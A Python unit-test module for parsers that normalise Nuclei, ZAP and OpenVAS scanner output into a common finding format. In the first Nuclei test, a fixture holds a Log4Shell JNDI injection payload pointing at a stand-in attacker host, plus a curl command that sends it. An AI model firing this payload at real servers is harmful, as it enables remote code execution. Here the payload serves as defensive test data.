"""Unit tests for security scanner parsers.

This module provides comprehensive tests for parsing output from various
security scanners (Nuclei, ZAP, OpenVAS) into normalized finding objects.
"""

import json
from datetime import datetime

import pytest

from scanners.base import NormalizedFinding
from scanners.parsers.nuclei_parser import parse_nuclei_finding
from scanners.parsers.openvas_parser import parse_openvas_report
from scanners.parsers.zap_parser import parse_zap_alert


# =============================================================================
# Nuclei Parser Tests
# =============================================================================


class TestNucleiParser:
    """Tests for Nuclei JSON parser."""

    def test_parse_nuclei_finding_with_all_fields(self):
        """Test parsing a complete Nuclei finding with all fields present."""
        nuclei_data = {
            "template-id": "cve-2021-44228-log4j-rce",
            "info": {
                "name": "Log4j RCE (CVE-2021-44228)",
                "severity": "critical",
                "description": "Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.",
                "remediation": "Upgrade to Log4j 2.17.0 or later",
                "classification": {
                    "cve-id": ["CVE-2021-44228"],
                    "cwe-id": ["CWE-502"],
                    "cvss-score": 10.0,
                    "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                },
            },
            "host": "https://example.com",
            "matched-at": "https://example.com/api/endpoint",
            "type": "http",
            "timestamp": "2024-01-15T10:30:00Z",
            "matcher-name": "jndi-injection",
            "extracted-results": ["${jndi:ldap://attacker.com/a}"],
            "curl-command": "curl -X POST https://example.com/api -d 'log=${jndi:ldap://attacker.com/a}'",
        }

        finding = parse_nuclei_finding(nuclei_data)

        assert isinstance(finding, NormalizedFinding)
        assert finding.severity == "critical"
        assert finding.title == "Log4j RCE (CVE-2021-44228)"
        assert finding.cvss_score == 10.0
        assert finding.cve_ids == ["CVE-2021-44228"]
        assert finding.cwe_ids == ["CWE-502"]
        assert finding.affected_url == "https://example.com/api/endpoint"
        assert "jndi-injection" in finding.evidence
        assert "Log4j" in finding.description
        assert "Upgrade to Log4j" in finding.remediation

    def test_parse_nuclei_finding_with_minimal_fields(self):
        """Test parsing Nuclei finding with only required fields."""
        nuclei_data = {
            "template-id": "basic-scan",
            "info": {
                "name": "Basic Vulnerability",
            },
            "host": "https://minimal.com",
        }

        finding = parse_nuclei_finding(nuclei_data)

        assert isinstance(finding, NormalizedFinding)
        assert finding.title == "Basic Vulnerability"
        assert finding.severity == "info"
        assert finding.cvss_score == 0.0
        assert finding.cve_ids == []
        assert finding.cwe_ids == []
        assert finding.affected_url == "https://minimal.com"

    def test_nuclei_severity_normalization_critical(self):
        """Test Nuclei severity normalization for critical level."""
        nuclei_data = {
            "template-id": "test-critical",
            "info": {
                "name": "Critical Issue",
                "severity": "CRITICAL",
            },
            "host": "https://test.com",
        }

        finding = parse_nuclei_finding(nuclei_data)
        assert finding.severity == "critical"

    def test_nuclei_severity_normalization_high(self):
        """Test Nuclei severity normalization for high level."""
        nuclei_data = {
            "template-id": "test-high",
            "info": {
                "name": "High Issue",
                "severity": "high",
            },
            "host": "https://test.com",
        }

        finding = parse_nuclei_finding(nuclei_data)
        assert finding.severity == "high"

    def test_nuclei_severity_normalization_medium(self):
        """Test Nuclei severity normalization for medium level."""
        nuclei_data = {
            "template-id": "test-medium",
            "info": {
                "name": "Medium Issue",
                "severity": "medium",
            },
            "host": "https://test.com",
        }

        finding = parse_nuclei_finding(nuclei_data)
        assert finding.severity == "medium"

    def test_nuclei_severity_normalization_low(self):
        """Test Nuclei severity normalization for low level."""
        nuclei_data = {
            "template-id": "test-low",
            "info": {
                "name": "Low Issue",
                "severity": "low",
            },
            "host": "https://test.com",
        }

        finding = parse_nuclei_finding(nuclei_data)
        assert finding.severity == "low"

    def test_nuclei_severity_normalization_informational(self):
        """Test Nuclei severity normalization for informational (maps to info)."""
        nuclei_data = {
            "template-id": "test-info",
            "info": {
                "name": "Informational Finding",
                "severity": "informational",
            },
            "host": "https://test.com",
        }

        finding = parse_nuclei_finding(nuclei_data)
        assert finding.severity == "info"

    def test_nuclei_cve_extraction_multiple(self):
        """Test Nuclei CVE ID extraction from multiple CVEs."""
        nuclei_data = {
            "template-id": "multi-cve",
            "info": {
                "name": "Multiple Vulnerabilities",
                "classification": {
                    "cve-id": ["CVE-2021-44228", "CVE-2021-45046", "CVE-2021-45047"],
                },
            },
            "host": "https://test.com",
        }

        finding = parse_nuclei_finding(nuclei_data)
        assert finding.cve_ids == ["CVE-2021-44228", "CVE-2021-45046", "CVE-2021-45047"]

    def test_nuclei_cve_extraction_single_string(self):
        """Test Nuclei CVE ID extraction when single CVE is provided as string."""
        nuclei_data = {
            "template-id": "single-cve",
            "info": {
                "name": "Single CVE",
                "classification": {
                    "cve-id": "CVE-2024-0001",
                },
            },
            "host": "https://test.com",
        }

        finding = parse_nuclei_finding(nuclei_data)
        assert finding.cve_ids == ["CVE-2024-0001"]

    def test_nuclei_cwe_extraction(self):
        """Test Nuclei CWE ID extraction."""
        nuclei_data = {
            "template-id": "test-cwe",
            "info": {
                "name": "CWE Test",
                "classification": {
                    "cwe-id": ["CWE-502", "CWE-434"],
                },
            },
            "host": "https://test.com",
        }

        finding = parse_nuclei_finding(nuclei_data)
        assert finding.cwe_ids == ["CWE-502", "CWE-434"]

    def test_nuclei_cvss_score_conversion_to_float(self):
        """Test Nuclei CVSS score conversion from string to float."""
        nuclei_data = {
            "template-id": "cvss-test",
            "info": {
                "name": "CVSS Test",
                "classification": {
                    "cvss-score": "7.5",
                },
            },
            "host": "https://test.com",
        }

        finding = parse_nuclei_finding(nuclei_data)
        assert finding.cvss_score == 7.5
        assert isinstance(finding.cvss_score, float)

    def test_nuclei_matched_at_takes_priority_over_host(self):
        """Test that matched-at URL takes priority over host in affected_url."""
        nuclei_data = {
            "template-id": "url-test",
            "info": {"name": "URL Test"},
            "host": "https://example.com",
            "matched-at": "https://example.com/specific/path",
        }

        finding = parse_nuclei_finding(nuclei_data)
        assert finding.affected_url == "https://example.com/specific/path"

    def test_nuclei_evidence_building_with_matcher_name(self):
        """Test Nuclei evidence string includes matcher name."""
        nuclei_data = {
            "template-id": "evidence-test",
            "info": {"name": "Evidence Test"},
            "host": "https://test.com",
            "matcher-name": "body-regex",
        }

        finding = parse_nuclei_finding(nuclei_data)
        assert "Matcher: body-regex" in finding.evidence

    def test_nuclei_evidence_building_with_extracted_results(self):
        """Test Nuclei evidence string includes extracted results."""
        nuclei_data = {
            "template-id": "evidence-test",
            "info": {"name": "Evidence Test"},
            "host": "https://test.com",
            "extracted-results": ["result1", "result2"],
        }

        finding = parse_nuclei_finding(nuclei_data)
        assert "Extracted: result1, result2" in finding.evidence

    def test_nuclei_finding_id_uniqueness(self):
        """Test that Nuclei finding IDs include timestamp for uniqueness."""
        nuclei_data = {
            "template-id": "unique-id-test",
            "info": {"name": "Unique ID Test"},
            "host": "https://test.com",
        }

        finding1 = parse_nuclei_finding(nuclei_data)
        finding2 = parse_nuclei_finding(nuclei_data)

        assert finding1.finding_id != finding2.finding_id
        assert "unique-id-test" in finding1.finding_id
        assert "unique-id-test" in finding2.finding_id


# =============================================================================
# ZAP Parser Tests
# =============================================================================


class TestZAPParser:
    """Tests for OWASP ZAP alert parser."""

    def test_parse_zap_alert_with_all_fields(self):
        """Test parsing a complete ZAP alert with all fields present."""
        zap_alert = {
            "pluginId": "10021",
            "alertRef": "10021",
            "alert": "X-Content-Type-Options Header Missing",
            "name": "X-Content-Type-Options Header Missing",
            "riskcode": "1",
            "confidence": "2",
            "riskdesc": "Low (Medium)",
            "description": "The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'.",
            "uri": "https://example.com/",
            "url": "https://example.com/",
            "method": "GET",
            "param": "Content-Type",
            "attack": "Test payload",
            "evidence": "Response headers missing X-Content-Type-Options",
            "solution": "Ensure that the application/web server sets the Content-Type header appropriately.",
            "cweid": "693",
            "wascid": "15",
            "reference": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
        }

        finding = parse_zap_alert(zap_alert)

        assert isinstance(finding, NormalizedFinding)
        assert finding.severity == "low"
        assert finding.title == "X-Content-Type-Options Header Missing"
        assert finding.affected_url == "https://example.com/"
        assert finding.cwe_ids == ["CWE-693"]
        assert finding.cvss_score == 2.5
        assert "GET" in finding.evidence
        assert "Content-Type" in finding.evidence
        assert "Test payload" in finding.evidence

    def test_parse_zap_alert_with_minimal_fields(self):
        """Test parsing ZAP alert with only required fields."""
        zap_alert = {
            "pluginId": "10000",
            "name": "Minimal Alert",
            "riskcode": "0",
        }

        finding = parse_zap_alert(zap_alert)

        assert isinstance(finding, NormalizedFinding)
        assert finding.title == "Minimal Alert"
        assert finding.severity == "info"
        assert finding.cvss_score == 0.0

    def test_zap_risk_level_to_severity_high(self):
        """Test ZAP risk level 3 maps to high severity."""
        zap_alert = {
            "pluginId": "40001",
            "name": "High Risk Alert",
            "riskcode": "3",
            "url": "https://test.com",
        }

        finding = parse_zap_alert(zap_alert)
        assert finding.severity == "high"
        assert finding.cvss_score == 7.5

    def test_zap_risk_level_to_severity_medium(self):
        """Test ZAP risk level 2 maps to medium severity."""
        zap_alert = {
            "pluginId": "40002",
            "name": "Medium Risk Alert",
            "riskcode": "2",
            "url": "https://test.com",
        }

        finding = parse_zap_alert(zap_alert)
        assert finding.severity == "medium"
        assert finding.cvss_score == 5.0

    def test_zap_risk_level_to_severity_low(self):
        """Test ZAP risk level 1 maps to low severity."""
        zap_alert = {
            "pluginId": "40003",
            "name": "Low Risk Alert",
            "riskcode": "1",
            "url": "https://test.com",
        }

        finding = parse_zap_alert(zap_alert)
        assert finding.severity == "low"
        assert finding.cvss_score == 2.5

    def test_zap_risk_level_to_severity_info(self):
        """Test ZAP risk level 0 maps to info severity."""
        zap_alert = {
            "pluginId": "40004",
            "name": "Informational Alert",
            "riskcode": "0",
            "url": "https://test.com",
        }

        finding = parse_zap_alert(zap_alert)
        assert finding.severity == "info"
        assert finding.cvss_score == 0.0

    def test_zap_cwe_extraction_valid_id(self):
        """Test ZAP CWE ID extraction from valid cweid."""
        zap_alert = {
            "pluginId": "10021",
            "name": "CWE Alert",
            "cweid": "693",
            "url": "https://test.com",
        }

        finding = parse_zap_alert(zap_alert)
        assert finding.cwe_ids == ["CWE-693"]

    def test_zap_cwe_extraction_ignores_negative_one(self):
        """Test ZAP CWE extraction ignores -1 (no CWE assigned)."""
        zap_alert = {
            "pluginId": "10000",
            "name": "No CWE Alert",
            "cweid": "-1",
            "url": "https://test.com",
        }

        finding = parse_zap_alert(zap_alert)
        assert finding.cwe_ids == []

    def test_zap_confidence_level_mapping(self):
        """Test ZAP confidence level is included in evidence."""
        zap_alert = {
            "pluginId": "10021",
            "name": "Confidence Test",
            "confidence": "3",
            "url": "https://test.com",
        }

        finding = parse_zap_alert(zap_alert)
        assert "Confidence: High" in finding.evidence

    def test_zap_evidence_building_with_method(self):
        """Test ZAP evidence includes HTTP method."""
        zap_alert = {
            "pluginId": "10000",
            "name": "Method Test",
            "url": "https://test.com",
            "method": "POST",
        }

        finding = parse_zap_alert(zap_alert)
        assert "Method: POST" in finding.evidence

    def test_zap_evidence_building_with_parameter(self):
        """Test ZAP evidence includes vulnerable parameter."""
        zap_alert = {
            "pluginId": "10000",
            "name": "Param Test",
            "url": "https://test.com",
            "param": "username",
        }

        finding = parse_zap_alert(zap_alert)
        assert "Parameter: username" in finding.evidence

    def test_zap_no_cve_ids_in_findings(self):
        """Test that ZAP findings never include CVE IDs (not provided by ZAP)."""
        zap_alert = {
            "pluginId": "10000",
            "name": "No CVE Alert",
            "url": "https://test.com",
        }

        finding = parse_zap_alert(zap_alert)
        assert finding.cve_ids == []

    def test_zap_finding_id_format(self):
        """Test ZAP finding ID includes plugin ID and URL."""
        zap_alert = {
            "pluginId": "10021",
            "name": "ID Format Test",
            "url": "https://example.com/test",
        }

        finding = parse_zap_alert(zap_alert)
        assert "zap_10021" in finding.finding_id
        assert "example.com" in finding.finding_id


# =============================================================================
# OpenVAS Parser Tests
# =============================================================================


class TestOpenVASParser:
    """Tests for OpenVAS XML report parser."""

    def test_parse_openvas_report_with_valid_xml(self):
        """Test parsing valid OpenVAS XML report with single result."""
        xml_data = """<?xml version="1.0" encoding="UTF-8"?>
<report>
  <results>
    <result>
      <name>SSL/TLS: Certificate Expired</name>
      <host>192.168.1.1</host>
      <port>443/tcp</port>
      <threat>Medium</threat>
      <severity>5.0</severity>
      <description>The SSL certificate has expired.</description>
      <qod>80</qod>
      <qod_type>remote_banner</qod_type>
      <nvt oid="1.3.6.1.4.1.25623.1.0.103955">
        <name>SSL/TLS: Certificate Expired</name>
        <description>The SSL certificate has expired.</description>
        <solution>Renew the SSL certificate.</solution>
        <solution_type>Vendor Fix</solution_type>
        <family>SSL/TLS Certificate</family>
        <cvss_base>5.0</cvss_base>
        <tags>solution=Renew the SSL certificate|cvss_base_vector=AV:N/AC:L/Au:N/C:N/I:N/A:N</tags>
        <refs>
          <ref type="cve" id="CVE-2024-0001"/>
        </refs>
      </nvt>
    </result>
  </results>
</report>"""

        findings = parse_openvas_report(xml_data)

        assert len(findings) == 1
        finding = findings[0]
        assert isinstance(finding, NormalizedFinding)
        assert finding.title == "SSL/TLS: Certificate Expired"
        assert finding.severity == "medium"
        assert finding.cvss_score == 5.0
        assert finding.cve_ids == ["CVE-2024-0001"]
        assert "192.168.1.1" in finding.affected_url
        assert "443/tcp" in finding.affected_url

    def test_parse_openvas_report_empty_report(self):
        """Test parsing OpenVAS report with no results."""
        xml_data = """<?xml version="1.0" encoding="UTF-8"?>
<report>
  <results>
  </results>
</report>"""

        findings = parse_openvas_report(xml_data)
        assert findings == []

    def test_parse_openvas_report_multiple_results(self):
        """Test parsing OpenVAS report with multiple vulnerabilities."""
        xml_data = """<?xml version="1.0" encoding="UTF-8"?>
<report>
  <results>
    <result>
      <name>Vulnerability 1</name>
      <host>192.168.1.1</host>
      <port>80/tcp</port>
      <threat>High</threat>
      <severity>8.5</severity>
      <nvt oid="1.3.6.1.4.1.25623.1.0.001">
        <name>Vulnerability 1</name>
        <description>Test vulnerability 1</description>
      </nvt>
    </result>
    <result>
      <name>Vulnerability 2</name>
      <host>192.168.1.2</host>
      <port>443/tcp</port>
      <threat>Medium</threat>
      <severity>6.5</severity>
      <nvt oid="1.3.6.1.4.1.25623.1.0.002">
        <name>Vulnerability 2</name>
        <description>Test vulnerability 2</description>
      </nvt>
    </result>
  </results>
</report>"""

        findings = parse_openvas_report(xml_data)

        assert len(findings) == 2
        assert findings[0].title == "Vulnerability 1"
        assert findings[1].title == "Vulnerability 2"
        assert findings[0].severity == "high"
        assert findings[1].severity == "medium"

    def test_openvas_severity_mapping_critical(self):
        """Test OpenVAS CVSS score to severity: critical (9.0-10.0)."""
        xml_data = """<?xml version="1.0" encoding="UTF-8"?>
<report>
  <results>
    <result>
      <name>Critical Vulnerability</name>
      <host>192.168.1.1</host>
      <port>22/tcp</port>
      <threat>High</threat>
      <severity>9.5</severity>
      <nvt oid="1.3.6.1.4.1.25623.1.0.001">
        <name>Critical Vulnerability</name>
      </nvt>
    </result>
  </results>
</report>"""

        findings = parse_openvas_report(xml_data)
        assert findings[0].severity == "critical"

    def test_openvas_severity_mapping_high(self):
        """Test OpenVAS CVSS score to severity: high (7.0-8.9)."""
        xml_data = """<?xml version="1.0" encoding="UTF-8"?>
<report>
  <results>
    <result>
      <name>High Vulnerability</name>
      <host>192.168.1.1</host>
      <port>22/tcp</port>
      <threat>High</threat>
      <severity>7.5</severity>
      <nvt oid="1.3.6.1.4.1.25623.1.0.001">
        <name>High Vulnerability</name>
      </nvt>
    </result>
  </results>
</report>"""

        findings = parse_openvas_report(xml_data)
        assert findings[0].severity == "high"

    def test_openvas_severity_mapping_medium(self):
        """Test OpenVAS CVSS score to severity: medium (4.0-6.9)."""
        xml_data = """<?xml version="1.0" encoding="UTF-8"?>
<report>
  <results>
    <result>
      <name>Medium Vulnerability</name>
      <host>192.168.1.1</host>
      <port>22/tcp</port>
      <threat>Medium</threat>
      <severity>5.5</severity>
      <nvt oid="1.3.6.1.4.1.25623.1.0.001">
        <name>Medium Vulnerability</name>
      </nvt>
    </result>
  </results>
</report>"""

        findings = parse_openvas_report(xml_data)
        assert findings[0].severity == "medium"

    def test_openvas_severity_mapping_low(self):
        """Test OpenVAS CVSS score to severity: low (0.1-3.9)."""
        xml_data = """<?xml version="1.0" encoding="UTF-8"?>
<report>
  <results>
    <result>
      <name>Low Vulnerability</name>
      <host>192.168.1.1</host>
      <port>22/tcp</port>
      <threat>Low</threat>
      <severity>2.5</severity>
      <nvt oid="1.3.6.1.4.1.25623.1.0.001">
        <name>Low Vulnerability</name>
      </nvt>
    </result>
  </results>
</report>"""

        findings = parse_openvas_report(xml_data)
        assert findings[0].severity == "low"

    def test_openvas_severity_mapping_info(self):
        """Test OpenVAS CVSS score to severity: info (0.0)."""
        xml_data = """<?xml version="1.0" encoding="UTF-8"?>
<report>
  <results>
    <result>
      <name>Info Finding</name>
      <host>192.168.1.1</host>
      <port>22/tcp</port>
      <severity>0.0</severity>
      <nvt oid="1.3.6.1.4.1.25623.1.0.001">
        <name>Info Finding</name>
      </nvt>
    </result>
  </results>
</report>"""

        findings = parse_openvas_report(xml_data)
        assert findings[0].severity == "info"

    def test_openvas_threat_log_overrides_to_info(self):
        """Test OpenVAS threat level 'Log' overrides severity to info."""
        xml_data = """<?xml version="1.0" encoding="UTF-8"?>
<report>
  <results>
    <result>
      <name>Log Entry</name>
      <host>192.168.1.1</host>
      <port>22/tcp</port>
      <threat>Log</threat>
      <severity>5.0</severity>
      <nvt oid="1.3.6.1.4.1.25623.1.0.001">
        <name>Log Entry</name>
      </nvt>
    </result>
  </results>
</report>"""

        findings = parse_openvas_report(xml_data)
        assert findings[0].severity == "info"

    def test_openvas_cve_extraction_from_refs(self):
        """Test OpenVAS CVE extraction from refs section."""
        xml_data = """<?xml version="1.0" encoding="UTF-8"?>
<report>
  <results>
    <result>
      <name>CVE Finding</name>
      <host>192.168.1.1</host>
      <port>22/tcp</port>
      <severity>7.5</severity>
      <nvt oid="1.3.6.1.4.1.25623.1.0.001">
        <name>CVE Finding</name>
        <refs>
          <ref type="cve" id="CVE-2024-0001"/>
          <ref type="cve" id="CVE-2024-0002"/>
        </refs>
      </nvt>
    </result>
  </results>
</report>"""

        findings = parse_openvas_report(xml_data)
        assert "CVE-2024-0001" in findings[0].cve_ids
        assert "CVE-2024-0002" in findings[0].cve_ids

    def test_openvas_cwe_extraction_from_tags(self):
        """Test OpenVAS CWE extraction from tags field."""
        xml_data = """<?xml version="1.0" encoding="UTF-8"?>
<report>
  <results>
    <result>
      <name>CWE Finding</name>
      <host>192.168.1.1</host>
      <port>22/tcp</port>
      <severity>5.0</severity>
      <nvt oid="1.3.6.1.4.1.25623.1.0.001">
        <name>CWE Finding</name>
        <tags>solution=Fix the issue|cwe-79=Improper Neutralization of Input During Web Page Generation|cwe-89=SQL Injection</tags>
      </nvt>
    </result>
  </results>
</report>"""

        findings = parse_openvas_report(xml_data)
        assert "CWE-79" in findings[0].cwe_ids
        assert "CWE-89" in findings[0].cwe_ids

    def test_openvas_malformed_xml_returns_empty_list(self):
        """Test OpenVAS parser returns empty list on malformed XML."""
        malformed_xml = """<?xml version="1.0" encoding="UTF-8"?>
<report>
  <results>
    <result>
      <name>Unclosed tag
</report>"""

        findings = parse_openvas_report(malformed_xml)
        assert findings == []

    def test_openvas_evidence_building_with_host_port(self):
        """Test OpenVAS evidence includes host and port information."""
        xml_data = """<?xml version="1.0" encoding="UTF-8"?>
<report>
  <results>
    <result>
      <name>Evidence Test</name>
      <host>192.168.1.1</host>
      <port>8080/tcp</port>
      <severity>5.0</severity>
      <nvt oid="1.3.6.1.4.1.25623.1.0.001">
        <name>Evidence Test</name>
      </nvt>
    </result>
  </results>
</report>"""

        findings = parse_openvas_report(xml_data)
        assert "Host: 192.168.1.1" in findings[0].evidence
        assert "Port: 8080/tcp" in findings[0].evidence

    def test_openvas_affected_url_combining_host_port(self):
        """Test OpenVAS combines host and port into affected_url."""
        xml_data = """<?xml version="1.0" encoding="UTF-8"?>
<report>
  <results>
    <result>
      <name>URL Test</name>
      <host>192.168.1.50</host>
      <port>9000/tcp</port>
      <severity>5.0</severity>
      <nvt oid="1.3.6.1.4.1.25623.1.0.001">
        <name>URL Test</name>
      </nvt>
    </result>
  </results>
</report>"""

        findings = parse_openvas_report(xml_data)
        assert findings[0].affected_url == "192.168.1.50:9000/tcp"

    def test_openvas_finding_id_includes_timestamp(self):
        """Test OpenVAS finding ID includes OID, host, and port."""
        xml_data = """<?xml version="1.0" encoding="UTF-8"?>
<report>
  <results>
    <result>
      <name>ID Test</name>
      <host>10.0.0.1</host>
      <port>443/tcp</port>
      <severity>5.0</severity>
      <nvt oid="1.3.6.1.4.1.25623.1.0.999">
        <name>ID Test</name>
      </nvt>
    </result>
  </results>
</report>"""

        findings = parse_openvas_report(xml_data)
        finding_id = findings[0].finding_id
        assert "openvas_1.3.6.1.4.1.25623.1.0.999" in finding_id
        assert "10.0.0.1" in finding_id


# =============================================================================
# Cross-Parser Integration Tests
# =============================================================================


class TestParserConsistency:
    """Tests to ensure consistency across different parsers."""

    def test_all_parsers_return_normalized_finding(self):
        """Test that all parsers return NormalizedFinding objects."""
        # Nuclei
        nuclei_data = {"template-id": "test", "info": {"name": "Test"}, "host": "https://test.com"}
        nuclei_finding = parse_nuclei_finding(nuclei_data)

        # ZAP
        zap_alert = {"pluginId": "1", "name": "Test", "url": "https://test.com"}
        zap_finding = parse_zap_alert(zap_alert)

        # OpenVAS
        openvas_xml = """<?xml version="1.0"?>
<report><results><result>
<name>Test</name><host>10.0.0.1</host><port>22/tcp</port><severity>5.0</severity>
<nvt oid="1.0.0.1"><name>Test</name></nvt>
</result></results></report>"""
        openvas_findings = parse_openvas_report(openvas_xml)

        assert isinstance(nuclei_finding, NormalizedFinding)
        assert isinstance(zap_finding, NormalizedFinding)
        assert len(openvas_findings) > 0
        assert isinstance(openvas_findings[0], NormalizedFinding)

    def test_all_parsers_have_required_fields(self):
        """Test that all parsers populate required NormalizedFinding fields."""
        # Nuclei
        nuclei_data = {"template-id": "test", "info": {"name": "Test", "severity": "high"}, "host": "https://test.com"}
        nuclei_finding = parse_nuclei_finding(nuclei_data)

        # ZAP
        zap_alert = {"pluginId": "1", "name": "Test", "riskcode": "2", "url": "https://test.com"}
        zap_finding = parse_zap_alert(zap_alert)

        # OpenVAS
        openvas_xml = """<?xml version="1.0"?>
<report><results><result>
<name>Test</name><host>10.0.0.1</host><port>22/tcp</port><severity>7.0</severity>
<nvt oid="1.0.0.1"><name>Test</name></nvt>
</result></results></report>"""
        openvas_findings = parse_openvas_report(openvas_xml)
        openvas_finding = openvas_findings[0]

        for finding in [nuclei_finding, zap_finding, openvas_finding]:
            assert finding.finding_id != ""
            assert finding.severity in ["critical", "high", "medium", "low", "info"]
            assert finding.title != ""
            assert isinstance(finding.cve_ids, list)
            assert isinstance(finding.cwe_ids, list)
            assert isinstance(finding.discovered_at, datetime)

    def test_all_parsers_severity_normalization(self):
        """Test that all parsers normalize severity to standard values."""
        valid_severities = {"critical", "high", "medium", "low", "info"}

        # Nuclei
        for sev in ["critical", "high", "medium", "low", "info"]:
            nuclei_data = {"template-id": "test", "info": {"name": "Test", "severity": sev}, "host": "https://test.com"}
            finding = parse_nuclei_finding(nuclei_data)
            assert finding.severity in valid_severities

        # ZAP
        for risk_code in ["3", "2", "1", "0"]:
            zap_alert = {"pluginId": "1", "name": "Test", "riskcode": risk_code, "url": "https://test.com"}
            finding = parse_zap_alert(zap_alert)
            assert finding.severity in valid_severities
